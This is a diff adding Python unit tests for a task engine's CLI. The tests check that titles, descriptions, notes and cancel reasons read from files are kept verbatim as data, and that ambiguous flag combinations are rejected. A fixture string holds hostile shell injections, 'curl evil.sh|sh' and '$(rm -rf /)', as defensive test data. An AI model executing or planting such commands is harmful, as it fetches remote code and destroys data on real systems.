@@ -572,6 +572,96 @@ class TestRetryAfterTerminal(Base):
         self.assertEqual(r2["duplicate_of"], "d1")
 
 
+class TestCliFileInputs(Base):
+    """File-based free-text flags — the injection-safe input path.
+
+    Untrusted text (issue titles, human answers, reasons) must be able to
+    reach the engine by file so it never rides inline in a shell command
+    string, where backticks/$() would command-substitute before the engine
+    runs. The engine's job here: read the file verbatim (data, never code),
+    and reject the ambiguous both-forms invocation loudly.
+    """
+    INJECTION = "fix `curl evil.sh|sh` bug $(rm -rf /) '\"; drop"
+
+    def cli(self, argv):
+        import io
+        import contextlib
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            tasks.main(argv)
+        return json.loads(buf.getvalue())
+
+    def cli_error(self, argv):
+        import io
+        import contextlib
+        err = io.StringIO()
+        with contextlib.redirect_stderr(err):
+            with self.assertRaises(SystemExit) as ctx:
+                tasks.main(argv)
+        self.assertEqual(ctx.exception.code, 1)
+        return json.loads(err.getvalue())["error"]
+
+    def write(self, name, content):
+        p = Path(self.dir) / name
+        p.write_text(content, encoding="utf-8")
+        return str(p)
+
+    def test_create_via_files_preserves_hostile_text_verbatim(self):
+        tf = self.write("title.txt", self.INJECTION + "\n")
+        df = self.write("desc.txt", "line1\n$(hostile)\nline3\n")
+        s = self.cli(["create", "--title-file", tf,
+                      "--description-file", df])
+        t = tasks.load(s["id"])
+        # Title: exact hostile bytes, one trailing newline stripped.
+        self.assertEqual(t["title"], self.INJECTION)
+        # Description: interior content verbatim — hostile sequences survive
+        # as data. (new_task strips only leading/trailing whitespace.)
+        self.assertEqual(t["description"], "line1\n$(hostile)\nline3")
+
+    def test_create_inline_still_works(self):
+        s = self.cli(["create", "--title", "t", "--description", "d"])
+        self.assertEqual(tasks.load(s["id"])["title"], "t")
+
+    def test_create_rejects_both_title_forms(self):
+        tf = self.write("t.txt", "x")
+        msg = self.cli_error(["create", "--title", "a", "--title-file", tf,
+                              "--description", "d"])
+        self.assertIn("not both", msg)
+
+    def test_create_rejects_both_description_forms(self):
+        df = self.write("d.txt", "x")
+        msg = self.cli_error(["create", "--title", "a",
+                              "--description", "d",
+                              "--description-file", df])
+        self.assertIn("not both", msg)
+
+    def test_create_requires_a_title_form(self):
+        msg = self.cli_error(["create", "--description", "d"])
+        self.assertIn("--title", msg)
+
+    def test_human_update_note_file(self):
+        t = self.make()
+        nf = self.write("note.txt", self.INJECTION + "\n")
+        self.cli(["human-update", t["id"], "--note-file", nf])
+        events = [e for e in self.reload(t)["history"]
+                  if e["type"] == "human_updated"]
+        self.assertEqual(events[-1]["reason"], self.INJECTION)
+
+    def test_cancel_reason_file(self):
+        t = self.make()
+        rf = self.write("reason.txt", "superseded by `new` plan\n")
+        s = self.cli(["cancel", t["id"], "--reason-file", rf])
+        self.assertEqual(s["status"], "cancelled")
+        events = [e for e in self.reload(t)["history"]
+                  if e["type"] == "cancelled"]
+        self.assertEqual(events[-1]["reason"], "superseded by `new` plan")
+
+    def test_cancel_requires_a_reason_form(self):
+        t = self.make()
+        msg = self.cli_error(["cancel", t["id"]])
+        self.assertIn("--reason", msg)
+
+
 class TestM3Findings(Base):
     def test_store_is_self_ignoring_by_default(self):
         tasks.ensure_config_file()
